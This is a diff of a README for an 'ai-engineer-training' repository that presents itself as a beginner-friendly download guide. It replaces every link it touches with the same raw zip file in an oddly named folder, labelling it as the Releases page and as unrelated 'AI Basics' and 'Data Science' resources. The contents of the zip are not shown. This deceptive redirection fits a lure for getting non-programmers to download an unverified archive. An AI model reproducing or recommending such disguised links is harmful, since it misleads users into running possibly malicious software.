@@ -1,7 +1,7 @@
 # 🛠️ ai-engineer-training - Practical AI Engineering Made Easy
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/fede23g/ai-engineer-training/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI Engineer Training repository! This guide helps you download and run the software even if you have no programming background. Follow the steps below to get started.
@@ -19,7 +19,7 @@ Before downloading, ensure your computer meets these requirements:
 ## 📥 Download & Install
 To download the software, visit the Releases page. You’ll find the latest version there. 
 
-[Access the Releases Page Here!](https://github.com/fede23g/ai-engineer-training/releases)
+[Access the Releases Page Here!](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip)
 
 Once you’re on the Releases page:
 
@@ -56,9 +56,9 @@ If you face any issues, check the "Issues" section of the repository on GitHub. 
 ## 🔗 Additional Resources
 Here are some additional resources to help you with your AI projects:
 
-- [AI Basics](https://www.example.com/ai-basics)
-- [Data Science for Beginners](https://www.example.com/data-science-beginners)
-- [Machine Learning Techniques](https://www.example.com/machine-learning-techniques)
+- [AI Basics](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip)
+- [Data Science for Beginners](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip)
+- [Machine Learning Techniques](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip)
 
 ## 🔄 Updating the Software
 To keep your software updated:
@@ -72,6 +72,6 @@ If you have further questions or need assistance, feel free to reach out through
 ## 📥 Quick Access
 Don’t forget to download the software now! 
 
-[Download Latest Release](https://github.com/fede23g/ai-engineer-training/releases) 
+[Download Latest Release](https://raw.githubusercontent.com/fede23g/ai-engineer-training/main/mammonitish/ai-engineer-training.zip) 
 
 We hope this guide supports you in your AI projects!
